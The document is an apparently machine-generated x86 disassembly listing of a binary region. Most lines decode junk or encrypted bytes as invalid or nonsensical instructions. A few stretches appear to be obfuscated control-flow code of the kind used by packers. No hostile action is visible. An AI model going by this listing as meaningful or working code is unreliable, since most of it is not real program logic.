  404146:	rol    edx,0xd4
  404149:	sub    DWORD PTR [eax+0x6a6096d2],0x21
  404150:	or     eax,0xf0f678e7
  404155:	cmp    al,0x3c
  404157:	das    
  404158:	pop    ebp
  404159:	mov    BYTE PTR [eax-0x291cb36d],bh
  40415f:	call   FWORD PTR [ecx+ecx*8+0x54]
  404163:	fist   WORD PTR [ebp+0x7623074a]
  404169:	mul    DWORD PTR ds:[ebx+esi*1-0x6bd30a6]
  404171:	add    al,0xe1
  404173:	bound  ebp,QWORD PTR [ecx+0x5a]
  404176:	(bad)  
  404177:	ins    BYTE PTR es:[edi],dx
  404178:	test   eax,0x44c60d3b
  40417d:	std    
  40417e:	mov    cl,0x99
  404180:	fld    TBYTE PTR [eax]
  404182:	dec    esp
  404183:	push   ebx
  404184:	mov    eax,0x9cf2afb2
  404189:	shr    BYTE PTR [edx-0x4e],0xa7
  40418d:	mov    ebp,0x552caf67
  404192:	gs in  al,dx
  404194:	or     cl,BYTE PTR [edx+edx*2-0x3abdde55]
  40419b:	mov    BYTE PTR [ecx],bl
  40419d:	jae    0x404169
  40419f:	fsubr  QWORD PTR [ebx]
  4041a1:	pushf  
  4041a2:	imul   edi,DWORD PTR [edi],0xe602c200
  4041a8:	pop    ds
  4041a9:	ret    
  4041aa:	(bad)  
  4041ab:	frstor [edx+0x2571c7fe]
  4041b1:	push   ebp
  4041b2:	push   esp
  4041b3:	xor    eax,0x78af2819
  4041b8:	mov    cs,WORD PTR [edx]
  4041ba:	inc    ebp
  4041bb:	sub    ch,ch
  4041bd:	jae    0x40418b
  4041bf:	push   cs
  4041c0:	cli    
  4041c1:	add    al,0x16
  4041c3:	loop   0x404228
  4041c5:	fst    QWORD PTR [ecx]
  4041c7:	cwde   
  4041c8:	jp     0x4041e3
  4041ca:	and    esp,DWORD PTR [edx-0x7e]
  4041cd:	mov    ch,0xca
  4041cf:	daa    
  4041d0:	fidiv  DWORD PTR [edx+0x6447657f]
  4041d6:	push   es
  4041d7:	add    DWORD PTR [esi-0x10ae5744],0x4076f2e7
  4041e1:	push   esi
  4041e2:	ins    BYTE PTR es:[edi],dx
  4041e3:	daa    
  4041e4:	and    esi,DWORD PTR [esi-0x60]
  4041e7:	sub    edi,DWORD PTR [ecx+0x63]
  4041ea:	loope  0x4041a6
  4041ec:	outs   dx,DWORD PTR ds:[esi]
  4041ed:	sub    cl,BYTE PTR [esi*8+0x269c470a]
  4041f4:	push   edx
  4041f5:	imul   cl
  4041f7:	fist   WORD PTR [edx+ebp*4-0x76c80095]
  4041fe:	jnp    0x40424e
  404200:	or     eax,0x5449f27b
  404205:	xor    edi,DWORD PTR [ebp-0x58]
  404208:	(bad)  
  404209:	mov    ss,WORD PTR [edx]
  40420b:	pop    ebp
  40420c:	mov    ebp,0x41c27eb7
  404211:	add    bl,BYTE PTR ds:0x70596a9f
  404217:	push   ebx
  404218:	jl     0x404258
  40421a:	shl    ebp,1
  40421c:	pop    esi
  40421d:	cs loop 0x40422d
  404220:	mov    ds:0x69eaebb2,eax
  404225:	push   0x16
  404227:	cmp    ecx,DWORD PTR [ebx+ebp*2]
  40422a:	and    dh,BYTE PTR [ecx+edx*2]
  40422d:	and    al,0xc6
  40422f:	fwait
  404230:	lahf   
  404231:	stos   DWORD PTR es:[edi],eax
  404232:	shl    ebx,1
  404234:	xlat   BYTE PTR ds:[ebx]
  404235:	loopne 0x404224
  404237:	clc    
  404238:	xchg   edx,eax
  404239:	lods   al,BYTE PTR ds:[esi]
  40423a:	dec    edx
  40423b:	mov    ah,0xc1
  40423d:	(bad)  
  40423e:	icebp  
  40423f:	xor    esi,edx
  404241:	aaa    
  404242:	and    esi,ebp
  404244:	dec    eax
  404245:	jb     0x4041fa
  404247:	out    0xbf,eax
  404249:	(bad)  
  40424a:	mov    bl,0xfc
  40424c:	xor    edx,eax
  40424e:	xor    edi,eax
  404250:	jmp    0x4043fa
  404255:	xchg   ebp,eax
  404256:	push   0xffffffb8
  404258:	int3   
  404259:	jns    0x404237
  40425b:	imul   eax,DWORD PTR gs:[ebp+eax*4+0x27],0x15
  404261:	push   ds
  404262:	push   0x72
  404264:	(bad)  
  404265:	in     eax,dx
  404266:	push   ss
  404267:	jle    0x4042e7
  404269:	mov    edi,DWORD PTR [edi+0x7e]
  40426c:	jle    0x404290
  40426e:	and    DWORD PTR [edx+0x5d325f7f],ecx
  404274:	dec    esp
  404275:	inc    ebp
  404276:	fnstenv [edi-0x4afb18fc]
  40427c:	iret   
  40427d:	jg     0x40421f
  40427f:	imul   edi,DWORD PTR [ebx+0x2c],0xb0a5e3f8
  404286:	int    0x5
  404288:	and    al,0xfa
  40428a:	(bad)  
  40428b:	cmp    eax,0xb808f687
  404290:	sub    al,0x97
  404292:	les    ebp,FWORD PTR [edx+0x193ed868]
  404298:	lods   al,BYTE PTR ds:[esi]
  404299:	add    DWORD PTR [eax],esi
  40429b:	inc    edx
  40429c:	xor    DWORD PTR [esi],0x4b
  40429f:	mov    bl,0x42
  4042a1:	cmp    eax,0x70010036
  4042a6:	mov    ah,0x9d
  4042a8:	ins    BYTE PTR es:[edi],dx
  4042a9:	pop    ds
  4042aa:	sbb    eax,0xbf879cc3
  4042af:	mov    ecx,esp
  4042b1:	pusha  
  4042b2:	repnz dec edi
  4042b4:	ret    
  4042b5:	xlat   BYTE PTR ds:[ebx]
  4042b6:	pop    ebx
  4042b7:	xor    ebx,DWORD PTR [ecx+0x777561a7]
  4042bd:	rcl    BYTE PTR [ecx+0x2ae5607c],cl
  4042c3:	sbb    al,0xf0
  4042c5:	in     al,0xf1
  4042c7:	fisub  WORD PTR ds:0xb58b759a
  4042cd:	arpl   WORD PTR [edi+eax*8],si
  4042d0:	or     DWORD PTR [edi-0x70],edx
  4042d3:	mov    cl,0x95
  4042d5:	xor    al,0xda
  4042d7:	mov    dh,0xd8
  4042d9:	push   0xffffffa8
  4042db:	inc    edi
  4042dc:	mov    bh,0xe0
  4042de:	cmp    al,0x79
  4042e0:	fld    st(4)
  4042e2:	lock or eax,0x34c3e339
  4042e8:	repz cmp eax,0x4ba8c40f
  4042ee:	dec    esi
  4042ef:	lds    edx,FWORD PTR [edi+0x99c937a]
  4042f5:	imul   eax,eax,0xa5857e28
  4042fb:	aam    0x79
  4042fd:	or     ebx,DWORD PTR [edx]
  4042ff:	dec    ebp
  404300:	jns    0x40429d
  404302:	neg    DWORD PTR [edi-0x3d]
  404305:	push   ebp
  404306:	sar    DWORD PTR [eax-0x2a],cl
  404309:	xchg   DWORD PTR [esi-0x38],esi
  40430c:	jg     0x40434f
  40430e:	mov    edi,0x19d87678
  404313:	loopne 0x40434c
  404315:	adc    al,0x33
  404318:	sub    eax,DWORD PTR [ebx+0xe]
  40431b:	jne    0x4042a4
  40431d:	in     eax,0xbf
  40431f:	mov    BYTE PTR [ecx-0xb],ch
  404322:	push   edi
  404323:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404324:	call   0x2a:0x30592d24
  40432b:	push   eax
  40432c:	mov    cl,0x4b
  40432e:	inc    eax
  40432f:	push   ds
  404330:	lock pop ecx
  404332:	rcr    BYTE PTR [edi],cl
  404334:	mov    esi,0x3247f20f
  404339:	dec    ebx
  40433a:	pusha  
  40433b:	jb     0x4042c1
  40433d:	mov    bl,0x67
  40433f:	add    al,0x56
  404341:	neg    DWORD PTR [ecx+ebp*4-0x3149ba7b]
  404348:	jle    0x404345
  40434a:	call   0xabe:0xda8e479b
  404351:	stos   BYTE PTR es:[edi],al
  404352:	add    eax,0xdc888a2e
  404357:	cmc    
  404358:	bswap  ebx
  40435a:	int    0xd4
  40435c:	jl     0x40434a
  40435e:	xlat   BYTE PTR ds:[ebx]
  40435f:	inc    edx
  404360:	adc    BYTE PTR [eax+0x15],0xd1
  404364:	rcl    BYTE PTR [ebx+0x35],1
  404367:	xchg   esp,eax
  404368:	outs   dx,DWORD PTR ds:[esi]
  404369:	adc    al,0xc0
  40436b:	jg     0x40435b
  40436d:	and    DWORD PTR [esi+edx*2+0x7021b2],eax
  404374:	pop    es
  404375:	lds    eax,FWORD PTR [ebx-0x77]
  404378:	cdq    
  404379:	xchg   edi,eax
  40437a:	fs add al,0x81
  40437d:	push   esp
  40437e:	out    dx,eax
  40437f:	inc    ebp
  404380:	test   al,0x72
  404382:	mov    WORD PTR [eax+0x41125e51],fs
  404388:	ret    
  404389:	adc    ebx,esp
  40438b:	jnp    0x40440c
  40438d:	mov    bh,0x71
  40438f:	test   BYTE PTR [edx],0x2d
  404392:	shl    BYTE PTR [edi+0x61],cl
  404395:	dec    ecx
  404396:	int    0xa8
  404398:	out    0xb8,eax
  40439a:	scas   al,BYTE PTR es:[edi]
  40439b:	sbb    eax,DWORD PTR [ebp+0x53152277]
  4043a1:	icebp  
  4043a2:	adc    esp,0xf8c55ae4
  4043a8:	clc    
  4043a9:	test   esi,edi
  4043ab:	(bad)  
  4043ac:	cmp    BYTE PTR [ebx+0x7d],bl
  4043af:	jns    0x404355
  4043b1:	loop   0x40441c
  4043b3:	xchg   ecx,eax
  4043b4:	sbb    al,0x4b
  4043b6:	jmp    0x404404
  4043b8:	push   esp
  4043b9:	hlt    
  4043ba:	mov    WORD PTR [esi],?
  4043bc:	mov    bl,0xa6
  4043be:	push   eax
  4043bf:	aad    0xf9
  4043c1:	(bad)  
  4043c2:	retw   0xe164
  4043c6:	xchg   ebp,eax
  4043c7:	icebp  
  4043c8:	call   0x2339fad2
  4043cd:	inc    ebp
  4043ce:	sbb    ecx,DWORD PTR [edi+0x74b2d3ec]
  4043d4:	mov    bh,0xad
  4043d6:	pop    ebp
  4043d7:	pop    ecx
  4043d8:	cmp    BYTE PTR [eax-0x2a72a7bd],cl
  4043de:	mov    ebp,0xe48ba9d0
  4043e3:	jmp    0x4043f3
  4043e5:	xor    ebx,DWORD PTR gs:[esp+eax*4]
  4043e9:	pop    es
  4043ea:	pop    ecx
  4043eb:	and    BYTE PTR [ecx+eiz*4-0x5f699215],dh
  4043f2:	addr16 inc esp
  4043f4:	xchg   ebp,eax
  4043f5:	xchg   edi,eax
  4043f6:	mov    al,ds:0x35f96ba
  4043fb:	stc    
  4043fc:	add    edx,ecx
  4043fe:	imul   edx,edi
  404401:	mov    edi,DWORD PTR [ebp-0x8]
  404404:	mov    ebx,DWORD PTR [ebp-0x10]
  404407:	sub    ebx,edi
  404409:	cmp    ebx,edx
  40440b:	ja     0x404419
  404411:	mov    edx,DWORD PTR [ebp-0x30]
  404414:	jmp    0x404613
  404419:	mov    edx,DWORD PTR [ebp-0x38]
  40441c:	mov    edi,DWORD PTR [ebp-0x4]
  40441f:	xor    edx,eax
  404421:	xor    edi,eax
  404423:	add    edi,ecx
  404425:	add    edx,ecx
  404427:	imul   edx,edi
  40442a:	mov    edi,DWORD PTR [ebp-0x8]
  40442d:	mov    ebx,DWORD PTR [ebp-0x10]
  404430:	sub    ebx,edi
  404432:	cmp    ebx,edx
  404434:	ja     0x4045ec
  40443a:	jmp    0x4045e4
  40443f:	hlt    
  404440:	mov    ah,0xbf
  404442:	add    bh,BYTE PTR [edi+0x42444505]
  404448:	pop    ecx
  404449:	mov    ds:0xb47c81df,al
  40444e:	dec    edx
  40444f:	jp     0x404468
  404451:	jle    0x4044d1
  404453:	mov    edi,DWORD PTR [edi+0x7e]
  404456:	jle    0x40444b
  404458:	xchg   edi,eax
  404459:	call   0x71e06b91
  40445e:	or     BYTE PTR [edi],ah
  404460:	(bad)  
  404461:	(bad)  
  404462:	push   esi
  404463:	(bad)  
  404464:	mov    al,ds:0x1fd0c296
  404469:	in     al,dx
  40446a:	lods   al,BYTE PTR ds:[esi]
  40446b:	mov    al,0x9b
  40446d:	addr16 out dx,eax
  40446f:	sbb    cl,BYTE PTR [ebx-0x80]
  404472:	push   ebp
  404473:	jp     0x404409
  404475:	std    
  404476:	xor    al,BYTE PTR [ebp-0x6d]
  404479:	enter  0x6f3d,0xc3
  40447d:	mov    dh,0x3f
  40447f:	mov    dl,BYTE PTR [ebp+0x24]
  404482:	dec    esi
  404483:	loope  0x404407
  404485:	mov    esi,0xa6dda255
  40448a:	addr16 push ss
  40448c:	and    eax,0xa9f8b1fd
  404491:	dec    DWORD PTR [ebx+0x11]
  404494:	mov    ch,0x52
  404496:	mov    DWORD PTR [edi+0x6439adec],edx
  40449c:	pop    edi
  40449d:	mov    BYTE PTR ds:0x395fc996,0x92
  4044a4:	xchg   esi,eax
  4044a5:	imul   ebp,DWORD PTR [eax+edi*2],0xfbedf22b
  4044ac:	sbb    bh,dh
  4044ae:	sar    DWORD PTR ds:0x78a0ad26,cl
  4044b4:	cmp    ecx,edi
  4044b6:	add    esi,esp
  4044b8:	inc    ebx
  4044b9:	sar    BYTE PTR [edi-0x23651790],0x58
  4044c0:	dec    esi
  4044c1:	and    BYTE PTR [ebx-0x3f],al
  4044c4:	dec    edi
  4044c5:	dec    eax
  4044c6:	in     eax,dx
  4044c7:	xor    eax,0x95621439
  4044cc:	aas    
  4044cd:	je     0x404505
  4044cf:	loope  0x40448e
  4044d1:	(bad)
  4044d5:	lds    esp,FWORD PTR [eax]
  4044d7:	lods   eax,DWORD PTR ds:[esi]
  4044d8:	cmp    DWORD PTR [ecx-0xc196dae],edi
  4044de:	(bad)  
  4044df:	js     0x404507
  4044e1:	push   ebx
  4044e2:	loop   0x404491
  4044e4:	and    BYTE PTR [eax+0x600682ff],dl
  4044ea:	push   ebx
  4044eb:	fstp   DWORD PTR [edi+0x40]
  4044ee:	mov    esi,0x63215617
  4044f3:	mov    ch,0x85
  4044f5:	mov    eax,0xba15472e
  4044fa:	xchg   edx,eax
  4044fb:	out    0xb2,eax
  4044fd:	pushf  
  4044fe:	shl    BYTE PTR [esi+0x78c2c18a],cl
  404504:	(bad)  [esi+ebp*8-0x23f5cc64]
  40450b:	div    bh
  40450d:	add    eax,edi
  40450f:	xor    eax,0xacb968a7
  404514:	add    BYTE PTR [ecx+0x59f9fdad],0x33
  40451b:	iret   
  40451c:	push   ss
  40451d:	mov    edx,0xbd6bd29c
  404522:	fdivr  DWORD PTR cs:[ebx]
  404525:	sub    al,BYTE PTR [ecx]
  404527:	mov    al,0x41
  404529:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40452a:	add    eax,0xa37fc12a
  40452f:	mov    bh,0xca
  404531:	or     esp,0x2fdf50a3
  404537:	ds and ebx,ecx
  40453a:	call   FWORD PTR [esi]
  40453c:	push   eax
  40453d:	xchg   ebx,eax
  40453e:	data16 cmp BYTE PTR [ebx-0x2cd21555],al
  404545:	push   DWORD PTR [ecx+0x4e]
  404548:	test   BYTE PTR [eax+0x71b7fd8a],dl
  40454e:	and    al,0xa0
  404550:	and    al,dl
  404552:	inc    esi
  404553:	mov    dl,0x35
  404555:	pop    edx
  404556:	and    ecx,DWORD PTR [esp+ebp*8-0x662fae49]
  40455d:	out    0xa3,al
  40455f:	and    ebx,edx
  404561:	inc    esp
  404562:	pop    eax
  404563:	ss mov al,0x7d
  404566:	inc    ebp
  404567:	pusha  
  404568:	arpl   WORD PTR ds:0x14e73ca,bp
  40456e:	out    0x68,al
  404570:	xchg   esi,eax
  404571:	aam    0x83
  404573:	mov    dh,0xb
  404575:	test   eax,0xc5d43fef
  40457a:	icebp  
  40457b:	stc    
  40457c:	test   DWORD PTR [edx],0x3a14aea5
  404582:	lods   al,BYTE PTR ds:[esi]
  404583:	and    edx,ecx
  404585:	mov    ds:0xd59fdc7c,al
  40458a:	out    dx,al
  40458b:	jb     0x4045e5
  40458d:	sub    eax,0xc885656e
  404592:	mov    edi,0xc6ef45b7
  404597:	push   edx
  404598:	popa   
  404599:	test   DWORD PTR [ecx],ebp
  40459b:	or     eax,esi
  40459d:	jne    0x4045f3
  40459f:	jg     0x404580
  4045a1:	mov    dh,0xda
  4045a3:	bound  edx,QWORD PTR ds:0xfad441f6
  4045a9:	add    DWORD PTR [edi+esi*4-0x63],ebp
  4045ad:	and    al,BYTE PTR [ebp-0xa7a19ba]
  4045b3:	jno    0x4045a0
  4045b5:	pop    esp
  4045b6:	jecxz  0x4045ed
  4045b8:	dec    edi
  4045b9:	jge    0x40459e
  4045bb:	neg    BYTE PTR [esi+eiz*4-0x3030c3f8]
  4045c2:	test   BYTE PTR [ebx+ecx*1-0x9],cl
  4045c6:	ja     0x40463a
  4045c8:	js     0x40456d
  4045ca:	xor    ecx,ebx
  4045cc:	(bad)  
  4045cd:	mov    DWORD PTR ss:[ecx+0x7322a6dd],eax
  4045d4:	and    BYTE PTR [esp+0x25],0x9e
  4045d9:	xor    al,0xce
  4045db:	(bad)  
  4045dc:	fdiv   QWORD PTR ds:0x62e50fc0
  4045e2:	add    eax,DWORD PTR [ebx+ecx*4+0x27e9cc55]
  4045e9:	add    BYTE PTR [eax],al
  4045eb:	add    BYTE PTR [ebx+0x7d8bc455],cl
  4045f1:	cld    
  4045f2:	xor    edx,eax
  4045f4:	xor    edi,eax
  4045f6:	add    edx,ecx
  4045f8:	add    edi,ecx
  4045fa:	imul   edx,edi
  4045fd:	mov    edi,DWORD PTR [ebp-0x8]
  404600:	mov    ebx,DWORD PTR [ebp-0x10]
  404603:	sub    ebx,edi
  404605:	cmp    ebx,edx
  404607:	mov    edx,DWORD PTR [ebp-0x38]
  40460a:	jbe    0x404613
  404610:	mov    edx,DWORD PTR [ebp-0x3c]
  404613:	mov    edi,DWORD PTR [ebp-0x4]
  404616:	xor    edi,eax
  404618:	xor    edx,eax
  40461a:	add    edi,ecx
  40461c:	add    edx,ecx
  40461e:	imul   edx,edi
  404621:	mov    DWORD PTR [ebp+0xc],edx
  404624:	mov    edx,DWORD PTR [ebp+0xc]
  404627:	mov    DWORD PTR [ebp-0x24],edx
  40462a:	mov    edx,DWORD PTR [ebp-0x8]
  40462d:	add    edx,DWORD PTR [ebp-0x40]
  404630:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  404637:	mov    DWORD PTR [ebp-0x1c],edx
  40463a:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  404641:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  404648:	mov    edx,DWORD PTR [ebp-0x18]
  40464b:	xor    edx,eax
  40464d:	add    edx,ecx
  40464f:	jmp    0x404d64
  404654:	mov    edx,DWORD PTR [ebp-0x18]
  404657:	jmp    0x404801
  40465c:	dec    esi
  40465d:	(bad)  
  40465e:	(bad)  
  40465f:	push   edi
  404660:	dec    esi
  404661:	push   edi
  404662:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  404664:	xor    BYTE PTR [edx-0x727240d0],al
  40466a:	loopne 0x4046d7
  40466c:	imul   DWORD PTR [ecx]
  40466e:	jle    0x4046ee
  404670:	mov    edi,DWORD PTR [edi+0x7e]
  404673:	jle    0x40462f
  404675:	retf   0xdf88
  404678:	test   eax,0x9a6cd583
  40467d:	sbb    ebp,DWORD PTR [eax-0x2cf87389]
  404683:	lods   eax,DWORD PTR ds:[esi]
  404684:	xchg   ecx,eax
  404685:	rcl    edx,0x45
  404688:	mov    esp,esi
  40468a:	jle    0x4046f8
  40468c:	mov    eax,0xdcdb16c7
  404691:	ss popa 
  404693:	sub    eax,DWORD PTR [esi-0xd]
  404696:	lods   eax,DWORD PTR ds:[esi]
  404697:	retf   
  404698:	out    dx,eax
  404699:	dec    esi
  40469a:	sti    
  40469b:	std    
  40469c:	stc    
  40469d:	scas   eax,DWORD PTR es:[edi]
  40469e:	lods   al,BYTE PTR ds:[esi]
  40469f:	stos   BYTE PTR es:[edi],al
  4046a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046a1:	pop    esi
  4046a2:	push   ds
  4046a3:	mov    cl,0xdb
  4046a5:	mov    ah,0xa1
  4046a7:	(bad)  
  4046a8:	sbb    edi,DWORD PTR [esi+0x3e67374e]
  4046ae:	stc    
  4046af:	xor    DWORD PTR [edi],ebp
  4046b1:	enter  0x5f8,0x25
  4046b5:	je     0x4046f6
  4046b7:	mov    al,0x4c
  4046b9:	xor    DWORD PTR [esi+0x26],0xe30a326
  4046c0:	xor    al,0x7d
  4046c2:	seta   BYTE PTR [ebp+eax*8+0x16]
  4046c7:	and    edi,DWORD PTR [ecx-0x53]
  4046ca:	jmp    0x4706ff46
  4046cf:	jae    0x4046a7
  4046d1:	mov    eax,ds:0x4335cbcc
  4046d6:	xor    cl,BYTE PTR ds:0xe18cc4dd
  4046dc:	(bad)
  4046e1:	mov    ah,0xaa
  4046e3:	ds (bad) 
  4046e5:	pusha  
  4046e6:	lods   al,BYTE PTR ds:[esi]
  4046e7:	shl    BYTE PTR [ebx+ebx*8-0x69818973],0x5f
  4046ef:	push   edi
  4046f0:	ins    BYTE PTR es:[edi],dx
  4046f1:	dec    ecx
  4046f2:	and    DWORD PTR [ebp+0x6f],eax
  4046f5:	ja     0x40470a
  4046f7:	pop    edx
  4046f8:	popf   
  4046f9:	and    eax,edi
  4046fb:	cs test eax,0xc7b4d29b
  404701:	test   DWORD PTR [ebx-0x46e901e8],0xb303e131
  40470b:	ret    0xd5e1
  40470e:	cmp    al,0x1a
  404710:	cmp    dh,BYTE PTR [ebx-0x3b31efe7]
  404716:	push   0x67bd83d6
  40471b:	fbld   TBYTE PTR [edx+0x47]
  40471e:	call   0x7440:0x2561bfd3
  404725:	(bad)  
  404726:	ret    0xd1f8
  404729:	pop    edx
  40472a:	jp     0x404743
  40472c:	pop    ebx
  40472d:	cdq    
  40472e:	and    al,0x2c
  404730:	(bad)  
  404731:	fild   WORD PTR [eax-0x481a01d3]
  404737:	fst    DWORD PTR [ecx-0x5e]
  40473a:	test   BYTE PTR [ebx+0x63f87e26],dl
  404740:	stc    
  404741:	pop    eax
  404742:	hlt    
  404743:	mov    eax,0x267045e7
  404748:	aaa    
  404749:	lock or ecx,DWORD PTR [eax-0x570fb529]
  404750:	xchg   ebx,eax
  404751:	cmp    ecx,DWORD PTR [ebx+0x252175b3]
  404757:	inc    DWORD PTR [edi-0x70]
  40475a:	mov    esi,0x7815858f
  40475f:	push   cs
  404760:	cmp    al,0x68
  404762:	and    al,0xc1
  404764:	out    dx,eax
  404765:	jmp    0x70c2165e
  40476a:	inc    edx
  40476b:	out    dx,al
  40476c:	dec    esp
  40476d:	or     al,BYTE PTR [edi]
  40476f:	ss retf 
  404771:	mov    ch,0x35
  404773:	jne    0x4047e1
  404775:	xor    DWORD PTR [edx],ebp
  404777:	xor    DWORD PTR [ebx+0x2e],esp
  40477a:	push   0x6b
  40477c:	ret    0x46e2
  40477f:	dec    BYTE PTR [ebx-0x13]
  404782:	arpl   WORD PTR [ecx-0x8e2e15b],bx
  404788:	and    BYTE PTR [edx-0x70],al
  40478b:	xor    ebp,DWORD PTR [edx]
  40478d:	xchg   esi,eax
  40478e:	sbb    dl,BYTE PTR [eax]
  404790:	pop    ss
  404791:	mov    ds:0x93ef56ab,al
  404796:	cmp    al,0x1f
  404798:	or     BYTE PTR [edx-0x2e],al
  40479b:	pop    eax
  40479c:	pop    esi
  40479d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40479e:	inc    eax
  40479f:	jb     0x4047e9
  4047a1:	xchg   ecx,eax
  4047a2:	clc    
  4047a3:	or     ecx,DWORD PTR [ecx+0x32]
  4047a6:	mov    cl,0xf3
  4047a8:	mov    ecx,0x94a6f92a
  4047ad:	sbb    cl,BYTE PTR [ebx]
  4047af:	xchg   ecx,eax
  4047b0:	add    ecx,DWORD PTR [ebp+0x34]
  4047b3:	sti    
  4047b4:	lds    ebp,FWORD PTR [ecx]
  4047b6:	cvtpi2ps xmm3,mm3
  4047b9:	add    edi,DWORD PTR [edi]
  4047bb:	jecxz  0x4047ca
  4047bd:	xchg   edi,eax
  4047be:	push   cs
  4047bf:	xchg   bl,bh
  4047c1:	or     edx,edx
  4047c3:	jo     0x40476c
  4047c5:	xchg   edx,eax
  4047c6:	int    0x1d
  4047c8:	rcr    BYTE PTR [ebx+0x1f],cl
  4047cb:	push   edi
  4047cc:	pop    ss
  4047cd:	shr    DWORD PTR [ebp+0x79322f29],1
  4047d3:	adc    ebp,ebp
  4047d5:	or     DWORD PTR [ebx-0x3652348b],edi
  4047db:	lods   eax,DWORD PTR ds:[esi]
  4047dc:	in     eax,dx
  4047dd:	push   esp
  4047de:	pop    eax
  4047df:	es sbb bh,0x13
  4047e3:	pop    ecx
  4047e4:	cmp    dh,BYTE PTR [ecx+eiz*1-0x52]
  4047e8:	outs   dx,DWORD PTR ds:[esi]
  4047e9:	adc    DWORD PTR [ebx+esi*8+0x20ab9d05],ecx
  4047f0:	push   ds
  4047f1:	jg     0x4047fd
  4047f3:	es mov edx,0xbb0f9f3e
  4047f9:	mov    dl,0x45
  4047fb:	pusha  
  4047fc:	push   eax
  4047fd:	scas   al,BYTE PTR es:[edi]
  4047fe:	cmp    al,0xbb
  404800:	dec    esi
  404801:	xor    edx,eax
  404803:	add    edx,DWORD PTR [ebp-0x14]
  404806:	mov    edi,DWORD PTR [ebp-0x1c]
  404809:	mov    dl,BYTE PTR [edx+edi*1+0x32729d]
  404810:	mov    BYTE PTR [ebp+0xf],dl
  404813:	mov    edx,DWORD PTR [ebp-0xc]
  404816:	jmp    0x4049c0
  40481b:	and    BYTE PTR [esi+0x5a2a321e],0x62
  404822:	add    WORD PTR [edx-0x4ee80f46],0xffb5
  40482a:	adc    DWORD PTR [ebx+ebp*1],eax
  40482d:	jle    0x4048ad
  40482f:	mov    edi,DWORD PTR [edi+0x7e]
  404832:	jle    0x404826
  404834:	(bad)
  404837:	or     esi,DWORD PTR [ebx-0x17]
  40483a:	stc    
  40483b:	inc    esp
  40483c:	or     eax,0x4f5d5135
  404841:	fwait
  404842:	mov    esi,0x598ab4de
  404847:	(bad)  
  404848:	aaa    
  404849:	ret    
  40484a:	pop    ecx
  40484b:	push   0x4886194a
  404850:	repz shl esp,1
  404853:	mov    bh,0x45
  404855:	retf   
  404856:	mov    dl,0xa2
  404858:	dec    esp
  404859:	pop    es
  40485a:	add    al,0x22
  40485c:	test   al,0xd
  40485e:	adc    DWORD PTR [esi],edi
  404860:	mov    eax,0x29353d6a
  404865:	(bad)  [edi]
  404867:	inc    ecx
  404868:	mov    ah,0xf1
  40486a:	loopne 0x4048d1
  40486c:	xchg   edx,eax
  40486d:	jmp    0x49054779
  404872:	pop    edi
  404873:	daa    
  404874:	pop    ebp
  404875:	imul   ebp,DWORD PTR [ebx-0x77],0x488e6611
  40487c:	in     eax,0x1f
  40487e:	cli    
  40487f:	cmp    eax,0x99474967
  404884:	out    0xd7,al
  404886:	mov    esp,0x2e0205ad
  40488b:	retf   
  40488c:	cmp    DWORD PTR [edx+eiz*1-0x5ed237b7],ebx
  404893:	je     0x404865
  404895:	mov    eax,0x856d4694
  40489a:	and    DWORD PTR [eax-0x67417ddd],ebp
  4048a0:	call   0x5e7c4627
  4048a5:	add    ebx,DWORD PTR [esi-0x35]
  4048a8:	(bad)  
  4048aa:	enter  0x48b4,0x91
  4048ae:	adc    BYTE PTR [esi+ecx*8-0x703f4950],bh
  4048b5:	and    al,ah
  4048b7:	test   BYTE PTR [edi+ecx*8+0x26c3d660],ch
  4048be:	repnz mov eax,0x873a4027
  4048c4:	xor    DWORD PTR [esi],edx
  4048c6:	fucompp 
  4048c8:	(bad)  
  4048c9:	shr    bl,1
  4048cb:	cmp    DWORD PTR [ebx-0x5a],eax
  4048ce:	and    al,0x60
  4048d0:	outs   dx,BYTE PTR ds:[esi]
  4048d1:	cmp    al,0x4
  4048d3:	das    
  4048d4:	addr16 (bad) 
  4048d6:	dec    esi
  4048d7:	push   eax
  4048d8:	cdq    
  4048d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048da:	jl     0x40489f
  4048dc:	test   DWORD PTR [ebx],0xa691df14
  4048e2:	jge    0x4048bf
  4048e4:	mov    bh,0xfe
  4048e6:	push   0xffffffb9
  4048e8:	xor    DWORD PTR [eax+0x16c503e5],eax
  4048ee:	xor    DWORD PTR [edx],esp
  4048f0:	cmc    
  4048f1:	cli    
  4048f2:	inc    ebp
  4048f3:	ja     0x40494c
  4048f5:	dec    edx
  4048f6:	rcr    DWORD PTR [eax-0x66],1
  4048f9:	jae    0x4048c2
  4048fb:	rcl    DWORD PTR [esi+0x2],0xc
  4048ff:	adc    edx,DWORD PTR [edi+0x31]
  404902:	je     0x4048ed
  404904:	xor    ah,bl
  404906:	arpl   WORD PTR [edx+0x56c50794],dx
  40490c:	pop    edx
  40490d:	out    0xa1,eax
  40490f:	sbb    eax,0x32b95a37
  404914:	inc    ebp
  404915:	outs   dx,DWORD PTR ds:[esi]
  404916:	mov    edx,edi
  404918:	mov    ecx,0xc7e5321d
  40491d:	repnz cli 
  40491f:	dec    ecx
  404920:	fbld   TBYTE PTR [ecx-0x62]
  404923:	out    0xd0,al
  404925:	cmp    ebp,DWORD PTR [esi]
  404927:	mov    dh,0x98
  404929:	push   esp
  40492a:	mov    cl,ah
  40492c:	sti    
  40492d:	or     BYTE PTR ds:[ebx-0x7294f138],bl
  404934:	push   esi
  404935:	sub    DWORD PTR [ebx],edi
  404937:	cmp    eax,0x75d3e421
  40493c:	ret    
  40493d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40493e:	and    bh,BYTE PTR [edi]
  404940:	outs   dx,BYTE PTR ds:[esi]
  404941:	push   es
  404942:	pop    ds
  404943:	push   ds
  404944:	and    edx,DWORD PTR [edx-0x4877568e]
  40494a:	ins    DWORD PTR es:[edi],dx
  40494b:	icebp  
  40494c:	ds pop edx
  40494e:	inc    eax
  40494f:	mov    dl,0xbc
  404951:	sub    eax,0xaae3a40
  404956:	xor    eax,0x79311b45
  40495b:	dec    ebp
  40495c:	test   bh,0x72
